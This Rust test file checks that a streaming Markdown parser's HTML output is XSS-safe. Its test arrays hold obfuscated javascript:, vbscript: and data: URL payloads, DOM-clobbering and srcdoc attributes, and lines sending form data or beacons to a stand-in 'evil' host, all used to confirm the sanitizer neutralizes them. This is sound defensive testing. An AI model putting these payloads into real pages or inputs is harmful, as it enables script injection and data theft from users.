//! Security regression tests. The core's whole promise is that its HTML output
//! is XSS-safe to inject (default config, raw HTML escaped). The subtle class
//! of bug here: a dangerous URL scheme obfuscated with HTML entities, backslash
//! escapes, control characters, or case so it slips past the scheme filter but
//! is reconstituted by the browser. The filter must run on the *decoded* form.

use brook_md_core::StreamParser;

fn render(md: &str) -> String {
    let mut p = StreamParser::new();
    p.append(md);
    p.finalize();
    let mut out = String::new();
    for b in p.all_blocks() {
        out.push_str(&b.html);
    }
    out
}

/// None of these obfuscations may yield a live `javascript:` (etc.) href.
#[test]
fn dangerous_link_schemes_are_neutralized() {
    let attacks = [
        "javascript:alert(1)",          // baseline
        "javascript&#58;alert(1)",      // numeric entity colon
        "javascript&#x3a;alert(1)",     // hex entity colon
        "javascript&#X3A;alert(1)",     // hex entity colon, upper X
        "javascript\\:alert(1)",        // backslash-escaped colon
        "JAVASCRIPT&#58;alert(1)",      // uppercase + entity
        "&#106;avascript:alert(1)",     // entity-encoded 'j'
        "java&#9;script:alert(1)",      // embedded tab
        "java&#10;script:alert(1)",     // embedded newline
        "  javascript:alert(1)",        // leading whitespace
        "vbscript&#58;msgbox(1)",       // vbscript via entity
        "data:text/&#104;tml,<script>", // data:text/html via entity 'h'
        "data:text/javascript,alert(1)",
    ];
    for a in attacks {
        let md = format!("[x]({a})\n");
        let out = render(&md);
        assert!(
            !out.contains("\"javascript:") && !out.contains("\"vbscript:"),
            "live dangerous scheme leaked for {a:?}: {out}"
        );
        assert!(!out.contains("data:text/html"), "data:text/html leaked for {a:?}: {out}");
        assert!(!out.contains("data:text/javascript"), "data:text/javascript leaked for {a:?}: {out}");
        // The blocked form is href="#".
        assert!(out.contains("href=\"#\""), "expected blocked href=# for {a:?}: {out}");
    }
}

/// Same obfuscations on image `src` must also be neutralized.
#[test]
fn dangerous_image_schemes_are_neutralized() {
    let attacks = [
        "javascript:alert(1)",
        "javascript&#58;alert(1)",
        "javascript\\:alert(1)",
        "vbscript&#58;x",
        "data:text/html,<script>alert(1)</script>",
    ];
    for a in attacks {
        let md = format!("![x]({a})\n");
        let out = render(&md);
        assert!(!out.contains("\"javascript:"), "img js leaked for {a:?}: {out}");
        assert!(!out.contains("data:text/html"), "img data:text/html leaked for {a:?}: {out}");
        assert!(out.contains("src=\"#\""), "expected blocked src=# for {a:?}: {out}");
    }
}

/// Script-capable `data:` media types (svg+xml, xhtml+xml, xml) must not
/// render as a live LINK href / autolink / component URL attribute — a browser
/// navigating to them executes their script. The inert IMAGE path keeps its
/// own `data:image/` allowlist (`<img src=data:image/svg+xml>` can't run
/// script), so that one is verified to still pass through.
#[test]
fn scriptable_data_links_are_neutralized() {
    // Space-free destinations (the real vector — a link/autolink URL cannot
    // contain spaces, so attackers base64/percent-encode the payload).
    let attacks = [
        "data:image/svg+xml;base64,PHN2Zz4=",
        "data:application/xhtml+xml;base64,PGh0bWw+",
        "data:text/xml;base64,PHgvPg==",
        "data:application/xml;base64,PHgvPg==",
        "data:application/javascript;base64,YWxlcnQoMSk=",
    ];
    for a in attacks {
        // Regular link.
        let out = render(&format!("[x]({a})\n"));
        assert!(out.contains("href=\"#\""), "link data: not blocked for {a:?}: {out}");
        assert!(!out.contains("href=\"data:"), "link data: leaked for {a:?}: {out}");
        // URI autolink.
        let out = render(&format!("<{a}>\n"));
        assert!(!out.contains("href=\"data:"), "autolink data: leaked for {a:?}: {out}");
    }
    // Carve-out: inline SVG/raster IMAGES via data: are inert and still render.
    assert!(
        render("![x](data:image/svg+xml;base64,PHN2Zz4=)\n").contains("src=\"data:image/svg+xml;base64,PHN2Zz4=\""),
        "data:image/svg+xml must still work as an <img src>",
    );
}

/// Legitimate URLs must still render (the fix must not over-block).
#[test]
fn legitimate_urls_still_render() {
    assert!(render("[x](https://example.com/a?b=1&c=2)\n")
        .contains("href=\"https://example.com/a?b=1&amp;c=2\""));
    assert!(render("[x](/relative/path)\n").contains("href=\"/relative/path\""));
    assert!(render("[x](mailto:a@b.com)\n").contains("href=\"mailto:a@b.com\""));
    assert!(render("[x](ftp://host/file)\n").contains("href=\"ftp://host/file\""));
    // A word that merely contains "javascript" is fine as a path.
    assert!(render("[x](/docs/javascript-guide)\n").contains("href=\"/docs/javascript-guide\""));
    // Images.
    assert!(render("![x](https://example.com/i.png)\n").contains("src=\"https://example.com/i.png\""));
    assert!(render("![x](data:image/png;base64,iVBOR)\n").contains("src=\"data:image/png;base64,iVBOR\""));
}

/// CommonMark URI autolinks (`<scheme:…>`) must route through the same
/// dangerous-scheme filter as regular links: a `javascript:`/`vbscript:`
/// autolink emits href="#", while a safe `https:` autolink still links.
#[test]
fn dangerous_autolink_schemes_are_neutralized() {
    for a in ["<javascript:alert(1)>", "<vbscript:msgbox(1)>", "<JaVaScRiPt:alert(1)>", "<file:///etc/passwd>"] {
        let out = render(&format!("{a}\n"));
        assert!(
            !out.contains("href=\"javascript:") && !out.contains("href=\"vbscript:"),
            "live dangerous autolink scheme leaked for {a:?}: {out}"
        );
        assert!(
            out.contains("href=\"#\""),
            "expected blocked href=# for autolink {a:?}: {out}"
        );
    }
}

/// A safe URI autolink still produces a working href (the fix must not over-block).
#[test]
fn safe_autolink_still_works() {
    let out = render("<https://example.com>\n");
    assert!(
        out.contains("href=\"https://example.com\""),
        "safe https autolink should still link: {out}"
    );
    // An email autolink is unaffected (separate code path).
    assert!(
        render("<a@b.com>\n").contains("href=\"mailto:a@b.com\""),
        "email autolink should still link"
    );
}

/// Raw HTML is escaped by default (unsafe_html off) — no tag injection.
#[test]
fn raw_html_is_escaped_by_default() {
    let out = render("<script>alert(1)</script>\n");
    assert!(!out.contains("<script>"), "raw <script> must be escaped: {out}");
    assert!(out.contains("&lt;script&gt;"), "expected escaped form: {out}");
}

/// With the sanitizer engaged, the ATTRIBUTE layer must be safe by policy, not
/// by luck. The second subtle bug class (after obfuscated URL schemes): an
/// attribute that is not an `on*` handler and not a URL, yet still lets markup
/// execute, re-parent, hijack or clobber — and several that are inert only
/// because the tag giving them meaning happens to be in the dangerous set.
#[test]
fn dom_hazard_attributes_never_reach_the_dom() {
    fn sanitized(md: &str) -> String {
        let mut p = StreamParser::new().with_html_sanitize(true, Vec::new(), Vec::new());
        p.append(md);
        p.finalize();
        let mut out = String::new();
        for b in p.all_blocks() {
            out.push_str(&b.html);
        }
        out
    }
    let attacks = [
        // Inline-document injection (inert only while `iframe` is dropped).
        "<span srcdoc=\"<script>alert(1)</script>\">x</span>",
        "<span SRCDOC='<img src=x onerror=alert(1)>'>x</span>",
        // Customized-built-in upgrade: bind to a registered class.
        "<span is=\"evil-element\">x</span>",
        // Interaction hijack.
        "<span autofocus>x</span>",
        "<span contenteditable=\"true\">x</span>",
        // DOM clobbering.
        "<img name=\"getElementById\" src=\"/p.png\">",
        "<a id=\"location\" href=\"/q\">x</a>",
        "<a Name=\"top\" href=\"/q\">x</a>",
        // Shadow-DOM surface.
        "<span slot=\"header\" part=\"body\" exportparts=\"body:x\">x</span>",
        // Form hijack (formaction is also a URL carrier).
        "<span form=\"login\" formaction=\"https://evil/steal\" formmethod=\"post\">x</span>",
        "<span FormAction=\"javascript:alert(1)\">x</span>",
        // Namespace escape hatch.
        "<span xmlns=\"http://www.w3.org/2000/svg\" xlink:href=\"javascript:alert(1)\">x</span>",
        // Tracking beacon.
        "<a href=\"/p\" ping=\"https://evil/beacon\">x</a>",
    ];
    for a in attacks {
        let out = sanitized(&format!("lead text {a} trailing\n"));
        for banned in [
            "srcdoc", "is=", "autofocus", "contenteditable", "name=", "id=", "slot",
            "part", "exportparts", "form", "xmlns", "xlink", "ping",
        ] {
            assert!(
                !out.to_lowercase().contains(banned),
                "{banned:?} survived sanitization of {a:?}: {out}"
            );
        }
        assert!(!out.contains("javascript:"), "live javascript: in {a:?}: {out}");
        assert!(out.contains("lead text") && out.contains("trailing"), "text kept: {out}");
    }
}

// ===== BLOCK-level raw HTML under the sanitizer (`set_block_html`) =====
//
// Stage 1 renders CommonMark HTML block types 6/7 through the sanitizer. These
// pin the boundary (types 1–5 stay escaped), the attribute policy (the hardened
// raw-HTML tier, not the permissive component one), and the invariant the
// speculative closers exist for: the emitted markup is a balanced tree at every
// stream prefix, so no prefix can ever leave a dangerous context open.

fn render_block_html(md: &str, allow: &[&str]) -> String {
    let mut p = StreamParser::new()
        .with_html_sanitize(true, allow.iter().map(|s| s.to_string()).collect(), vec![])
        .with_block_html(true);
    p.append(md);
    p.finalize();
    let mut out = String::new();
    for b in p.all_blocks() {
        out.push_str(&b.html);
    }
    out
}

fn render_block_html_unsafe(md: &str) -> String {
    let mut p = StreamParser::new()
        .with_unsafe_html(true)
        .with_html_sanitize(true, vec![], vec![])
        .with_block_html(true);
    p.append(md);
    p.finalize();
    let mut out = String::new();
    for b in p.all_blocks() {
        out.push_str(&b.html);
    }
    out
}

/// Every element in `html` as `(name, is_close, self_closing)`. Attribute values
/// are always double-quoted in our output, so a `>` inside one is not a
/// terminator.
fn html_tags(html: &str) -> Vec<(String, bool, bool)> {
    let b = html.as_bytes();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        if b[i] != b'<' {
            i += 1;
            continue;
        }
        let is_close = b.get(i + 1) == Some(&b'/');
        let name_start = i + 1 + usize::from(is_close);
        if !b.get(name_start).is_some_and(|c| c.is_ascii_alphabetic()) {
            i += 1;
            continue;
        }
        let mut j = name_start;
        while j < b.len() && (b[j].is_ascii_alphanumeric() || matches!(b[j], b'-' | b':')) {
            j += 1;
        }
        let name = html[name_start..j].to_ascii_lowercase();
        let mut in_quote = false;
        while j < b.len() && (in_quote || b[j] != b'>') {
            if b[j] == b'"' {
                in_quote = !in_quote;
            }
            j += 1;
        }
        let self_closing = j > 0 && b[j - 1] == b'/';
        out.push((name, is_close, self_closing));
        i = j + 1;
    }
    out
}

const VOID: &[&str] = &[
    "area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "param",
    "source", "track", "wbr",
];

/// The emitted markup must be a balanced tree: every close tag matches the
/// innermost open element and nothing is left open at the end. This is what the
/// speculative closers buy — a consumer injecting the HTML-so-far can never end
/// up inside an element the parser did not intend.
fn assert_balanced_tree(html: &str, ctx: &str) {
    let mut stack: Vec<String> = Vec::new();
    for (name, is_close, self_closing) in html_tags(html) {
        if VOID.contains(&name.as_str()) || self_closing {
            assert!(!is_close, "closer for a void element <{name}> {ctx}");
            continue;
        }
        if is_close {
            let top = stack.pop();
            assert_eq!(top.as_deref(), Some(name.as_str()), "unbalanced </{name}> {ctx}: {html}");
        } else {
            stack.push(name);
        }
    }
    assert!(stack.is_empty(), "unclosed elements {stack:?} {ctx}: {html}");
}

#[test]
fn block_script_is_escaped_in_every_mode() {
    // A block-level `<script>` is CommonMark type 1 and is ALSO in the
    // non-overridable dangerous set. It must never render raw — with the
    // sanitizer alone, with block_html on, with block_html + an explicit
    // allowlist entry, and with unsafe_html piled on top.
    for out in [
        render("<script>alert(1)</script>\n"),
        render_block_html("<script>alert(1)</script>\n", &[]),
        render_block_html("<script>alert(1)</script>\n", &["script"]),
        render_block_html("<script>alert(1)</script>\n", &["script", "div"]),
        render_block_html_unsafe("<script>alert(1)</script>\n"),
    ] {
        assert!(!out.to_lowercase().contains("<script"), "block script rendered raw: {out}");
        assert!(out.contains("&lt;script&gt;"), "block script must stay escaped: {out}");
    }
    // …and nested inside an opted-in type-6 block, where the dangerous set (not
    // the block type) is what stops it.
    let out = render_block_html("<div>\n<script>alert(1)</script>\n</div>\n", &[]);
    assert!(!out.to_lowercase().contains("<script"), "nested script dropped: {out}");
}

#[test]
fn type_1_blocks_stay_escaped_with_block_html_on() {
    // The stage-1 boundary: type 1 is the raw-text family, where a browser reads
    // everything after the tag as unparsed text and a speculative mid-stream
    // close is mXSS-prone. `block_html` must NOT reach it.
    for (md, tag) in [
        ("<pre>\n<b>x</b>\n</pre>\n", "pre"),
        ("<textarea>\n</textarea><img src=x onerror=alert(1)>\n</textarea>\n", "textarea"),
        ("<style>\nbody{background:url(https://evil/x)}\n</style>\n", "style"),
        ("<script type=\"module\">\nimport 'https://evil/x';\n</script>\n", "script"),
    ] {
        let out = render_block_html(md, &[]);
        let body = out
            .strip_prefix("<pre><code>")
            .and_then(|s| s.split_once("</code></pre>"))
            .unwrap_or_else(|| panic!("type-1 block must escape into a code block ({tag}): {out}"))
            .0;
        // Nothing inside the code block is markup: every `<` was escaped, so no
        // element of any kind (least of all the type-1 one) can render, and any
        // `on*=` text in there is inert content, not an attribute.
        assert!(!body.contains('<'), "type-1 body must be fully escaped ({tag}): {out}");
        assert!(body.contains(&format!("&lt;{tag}")), "the tag is there, as text ({tag}): {out}");
    }
    // The other escaped types: a declaration and a CDATA section stay inert too.
    assert!(render_block_html("<!DOCTYPE html>\n", &[]).contains("&lt;!DOCTYPE"));
    assert!(!render_block_html("<![CDATA[<script>alert(1)</script>]]>\n", &[])
        .to_lowercase()
        .contains("<script"));
}

#[test]
fn block_level_attributes_use_the_hardened_raw_html_policy() {
    // Proves the BLOCK path routes through `sanitize_raw_html_attrs` (the raw
    // tier), not the permissive component tier: on top of event handlers and
    // dangerous schemes it drops the DOM-hazard table (`id`, `name`, `srcdoc`,
    // `form*`, `is`, `ping`, …) and `style`.
    let md = "<div onclick=\"x()\" id=\"q\" name=\"n\" srcdoc=\"<script>\" is=\"x-evil\" \
              formaction=\"/f\" ping=\"https://evil/p\" style=\"position:fixed\" \
              contenteditable=\"true\" class=\"ok\" title=\"fine\">\nbody\n</div>\n";
    for allow in [&[][..], &["div"][..]] {
        let out = render_block_html(md, allow);
        assert!(out.contains("<div "), "div still renders: {out}");
        assert!(out.contains("class=\"ok\""), "safe attr kept: {out}");
        assert!(out.contains("title=\"fine\""), "safe attr kept: {out}");
        let low = out.to_lowercase();
        for attr in [
            "onclick", "id=", "name=", "srcdoc", "is=", "formaction", "ping=", "style=",
            "contenteditable",
        ] {
            assert!(!low.contains(attr), "{attr} must be dropped at block level: {out}");
        }
    }
    // A dangerous URL scheme on a block-level anchor is neutralized identically.
    let out = render_block_html("<div>\n<a href=\"javascript:alert(1)\">x</a>\n</div>\n", &[]);
    assert!(!out.contains("javascript:"), "scheme neutralized: {out}");
    assert!(out.contains("href=\"#\""), "blocked href → #: {out}");
}

#[test]
fn block_mis_nesting_still_emits_a_balanced_tree() {
    // mXSS probes: mis-nested pairs, a premature closer, an orphan table cell.
    // Whatever the input shape, the emitted markup must be a consistent tree —
    // implicit closers are spliced in before an author's out-of-order close tag
    // and a close tag matching nothing open is dropped.
    for md in [
        "<div>\n<b><i></b></i>\n</div>\n",
        "<div>\n</div>\n</div>\n",
        "<div>\n</span>\n",
        "<div>\n<table><td>orphan\n",
        "<div>\n<b>bold\n\ntail\n",
        "<div><div><div>\n",
        "<div>\n<b><i><u></b>\n</div>\n",
        "<mytag>\n<b>x</mytag>\n",
    ] {
        for allow in [&[][..], &["div", "b", "i", "u", "table", "td", "mytag", "span"][..]] {
            assert_balanced_tree(&render_block_html(md, allow), &format!("finalized {md:?}"));
        }
    }
}

#[test]
fn block_mis_nesting_is_balanced_at_every_stream_prefix() {
    // The streaming half: at every append boundary the HTML emitted so far must
    // already be a complete tree (that is what the speculative closers are for).
    for md in [
        "<div>\n<b><i></b></i>\n</div>\n",
        "<div>\n<table><td>orphan cell\n",
        "<div class=\"card\">\n<b>bold text\n",
        "<details>\n<summary>s</summary>\nbody\n</details>\n",
        "<div>\n<img src=x onerror=alert(1)>\n<b>x\n",
        "<div>\n<!-- <script>alert(1)</script> -->\n<b>y</b>\n",
    ] {
        let mut p = StreamParser::new()
            .with_html_sanitize(true, vec![], vec![])
            .with_block_html(true);
        let mut sent = String::new();
        let mut buf = [0u8; 4];
        for ch in md.chars() {
            p.append(ch.encode_utf8(&mut buf));
            sent.push(ch);
            let mut html = String::new();
            for b in p.all_blocks() {
                html.push_str(&b.html);
            }
            assert_balanced_tree(&html, &format!("prefix {sent:?}"));
        }
        p.finalize();
        let mut html = String::new();
        for b in p.all_blocks() {
            html.push_str(&b.html);
        }
        assert_balanced_tree(&html, &format!("finalize {md:?}"));
    }
}
